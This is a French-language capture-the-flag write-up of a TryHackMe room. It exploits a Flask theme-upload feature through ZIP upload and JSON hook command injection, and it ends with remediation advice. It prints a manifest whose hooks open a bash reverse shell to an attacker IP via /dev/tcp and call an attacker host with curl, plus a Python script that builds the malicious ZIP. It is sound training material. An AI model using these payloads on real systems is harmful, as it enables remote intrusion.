# 🏖️ Holiday Context — TryHackMe Writeup

> **Plateforme :** TryHackMe
> **Difficulté :** 🟢 Easy
> **Cible :** `10.114.170.181`
> **OS :** 🐧 Linux (Gunicorn / Python)
> **Flag :** `THM{z1p_sl1pp3d_1nt0_a_sh3ll}`
> **Date :** 2026-11-01

---

## 📖 Contexte

**Holiday Context** est une room TryHackMe de niveau facile centrée sur une application web Flask (Gunicorn) exposée sur le port `5000`. L'objectif est de compromettre l'application, d'obtenir un accès initial via une **chaîne Zip Slip → Command Injection**, puis de récupérer le flag.

La room met l'accent sur deux classes de vulnérabilités très courantes dans les applications de gestion de thèmes / plugins :

- **Zip Slip** — path traversal lors de l'extraction d'archives `.zip`
- **Command Injection** — exécution de commandes arbitraires via un manifeste JSON (`shell.json`)

---

## 1. 🔍 Reconnaissance & Énumération

### 1.1 Scan de ports

```bash
rustscan -a 10.114.170.181 --ulimit 5000 -- -sV -sC
```

| Port | État | Service |
|------|------|---------|
| 22   | open | SSH |
| 5000 | open | HTTP — Gunicorn (Python) |

### 1.2 Énumération web

```bash
gobuster dir -u http://10.114.170.181:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Une **mire de connexion** est rapidement identifiée. L'inspection du code source HTML de la page d'accueil révèle des **identifiants en clair** laissés par le développeur :

```html
<!-- TODO: remove before prod -->
<!-- username: concierge -->
<!-- password: StayNoticed2024! -->
```

| Champ | Valeur |
|-------|--------|
| **Username** | `concierge` |
| **Password** | `StayNoticed2024!` |

> 🚨 **Note** : ce type de fuite est extrêmement courant en CTF mais aussi en conditions réelles — un simple commentaire HTML ou un fichier `.git/` exposé suffit.

---

## 2. 🧪 Analyse de l'application

Après authentification, on accède au panneau **"Shoreline Display"**. L'application permet d'**uploader des archives `.zip`** représentant un "coquillage" (shell) avec les règles suivantes :

### Fonctionnalités observées

- **Formulaire d'upload** : accepte des fichiers `.zip`
- **Fichier manifeste obligatoire** : l'archive doit contenir un `shell.json` décrivant les assets
- **Extensions autorisées** dans l'archive : `png`, `jpg`, `gif`, `svg`, `css`, `json`
- **Moteur backend** : un composant nommé **Theme Worker** traite l'archive en arrière-plan pour appliquer d'éventuels *automation hooks*

### 🕵️ Indices textuels

Le texte d'aide contient un indice très explicite :

> *"Slip something inside and hold it to your ear (...) **Slip past what the portal forgets to check**, and the shell answers with a **shell of your own**."*

Ce message confirme **deux vulnérabilités** :

| Vulnérabilité | Indice dans le texte |
|---------------|----------------------|
| **Zip Slip** (path traversal) | *"Slip past what the portal forgets to check"* |
| **Command Injection → RCE** | *"the shell answers with a shell of your own"* |

---

## 3. 💥 Exploitation

### 3.1 Vérification de l'extraction ZIP

Un premier test avec une archive `.zip` standard confirme que l'application extrait les fichiers dans un **sous-dossier public** :

```
http://10.114.170.181:5000/shells/<HASH_ALÉATOIRE>/
```

Le hash étant aléatoire, il est possible d'extraire des fichiers en dehors de ce dossier via `../` dans les chemins d'archive.

### 3.2 Construction du payload malveillant

On construit une archive `.zip` qui contient :

1. Un manifeste **`shell.json`** piégé (injection de commande via les hooks)
2. Une **traversée de répertoire** (`../`) pour vérifier le Zip Slip

#### 📄 Manifeste `shell.json`

```json
{
  "name": "HookInjection",
  "version": "1.0",
  "assets": ["style.css"],
  "hooks": {
    "pre_apply": "bash -c 'bash -i >& /dev/tcp/192.168.135.15/4444 0>&1'",
    "post_apply": "; bash -i >& /dev/tcp/192.168.135.15/4444 0>&1 ;",
    "onload": "curl http://192.168.135.15:8000/hook_works"
  }
}
```

> ⚠️ Remplace `192.168.135.15` par **ton IP d'attaquant** (celle de ton interface `tun0` sous TryHackMe).

#### 🐍 Script `exploit.py` — génération du ZIP

```python
import zipfile

TARGET_IP = "192.168.135.15"   # ← ton IP tun0
PORT      = 4444
ZIP_NAME  = "payload_exploit.zip"

manifest = '''{
  "name": "HookInjection",
  "version": "1.0",
  "assets": ["style.css"],
  "hooks": {
    "pre_apply": "bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'"
  }
}''' % (TARGET_IP, PORT)

with zipfile.ZipFile(ZIP_NAME, 'w') as z:
    z.writestr("shell.json", manifest)
    z.writestr("style.css", "body { color: red; }")

print(f"[+] Archive {ZIP_NAME} générée avec succès.")
```

### 3.3 Obtention du flag

1. **Démarrer un listener** sur la machine d'attaque :
   ```bash
   nc -lvnp 4444
   ```

2. **Uploader** `payload_exploit.zip` sur :
   ```
   http://10.114.170.181:5000/upload
   ```

3. Le **Theme Worker** lit le manifeste et déclenche le hook `pre_apply` → **reverse shell** établi.

4. Le flag se trouve directement dans le shell :

   ```
   THM{z1p_sl1pp3d_1nt0_a_sh3ll}
   ```

---

## 4. 🗺️ Résumé du parcours d'attaque

```
[Recon]      Port 5000 → Gunicorn (Flask)
              ↓
[Fuite]     Credentials en commentaire HTML (concierge / StayNoticed2024!)
              ↓
[Auth]      Accès au panel Shoreline Display
              ↓
[Analyse]   Upload ZIP + manifest shell.json requis
              ↓
[Zip Slip]  Path traversal à l'extraction
              ↓
[Injection] Hooks JSON → commande shell exécutée
              ↓
[RCE]       Reverse shell via /dev/tcp
              ↓
[Flag]      THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

---

## 5. 🛡️ Remédiation

| Vulnérabilité | Recommandation |
|---------------|----------------|
| **Credentials en clair** (commentaire HTML) | Ne jamais committer d'identifiants ; utiliser des variables d'environnement et un gestionnaire de secrets |
| **Zip Slip** (path traversal) | Valider les chemins **résolus** avec `os.path.commonpath()` (Python) — refuser toute entrée dont `realpath` sort du dossier cible |
| **Command Injection** (hooks JSON) | Ne jamais passer une chaîne issue d'un fichier utilisateur à `os.system()` ou `subprocess(..., shell=True)`. Utiliser une **liste d'arguments** + `shell=False` |
| **Exécution de hooks** en général | Désactiver l'exécution arbitraire ; restreindre les hooks à un **format déclaratif** (ex: `{ "action": "set_bg", "value": "#fff" }`) |
| **Extraction ZIP** | Implémenter un **allowlist d'extensions** (déjà présent), vérifier la **signature** des fichiers, limiter la taille, extraire dans un dossier isolé puis **copier explicitement** les fichiers validés |
| **Moteur de traitement** | Exécuter le Theme Worker dans un **sandbox** (conteneur, seccomp, AppArmor) sans accès réseau sortant |

### 💡 Exemple de correctif `Zip Slip` en Python

```python
import os, zipfile

def safe_extract(zip_path, dest_dir):
    dest_dir = os.path.realpath(dest_dir)
    with zipfile.ZipFile(zip_path) as z:
        for member in z.namelist():
            target = os.path.realpath(os.path.join(dest_dir, member))
            if not target.startswith(dest_dir + os.sep):
                raise ValueError(f"Zip Slip détecté : {member}")
        z.extractall(dest_dir)
```

---

## 6. 📚 Références

- [Zip Slip — Snyk Research](https://security.snyk.io/research/zip-slip-vulnerability)
- [PortSwigger — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [Python `subprocess` — Secure usage](https://docs.python.org/3/library/subprocess.html#security-considerations)
- [TryHackMe — Holiday Context](https://tryhackme.com/)

---

*Writeup réalisé dans un cadre légal — machine CTF TryHackMe. Aucune cible réelle n'a été compromise.*
